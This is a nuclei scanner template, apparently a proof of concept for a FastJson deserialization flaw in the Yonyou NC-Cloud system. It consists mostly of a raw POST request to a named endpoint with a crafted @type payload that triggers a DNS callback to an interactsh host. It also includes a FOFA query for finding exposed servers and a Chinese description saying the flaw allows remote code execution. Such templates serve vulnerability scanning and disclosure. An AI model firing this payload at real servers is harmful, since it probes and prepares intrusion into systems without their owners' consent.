# Add your nuclei formatted PoC!
id: yongyou-NC-cloud-FastJson-RCE

info:
  name: 用友NC-Cloud系统反序列化漏洞(FastJson)
  author: yunzui
  severity: high
  metadata:
    fofa-query: app="用友-NC-Cloud"

http:
  - raw:
      - |              
        POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Connection: close
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

        {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
help: 用友NC Cloud/ncchr/pm/ref/indiIssued/blobRefClassSearch接口存在反序列化漏洞。攻击者可以通过构造特定的请求数据包，利用该接口的反序列化功能执行远程代码执行（RCE）攻击。由于反序列化过程中未能正确处理输入数据，导致攻击者可以控制反序列化过程，进而可能触发任意代码执行。这可能允许攻击者在服务器上执行恶意代码，获取敏感数据或控制服务器。
author: yunzui🇨🇳
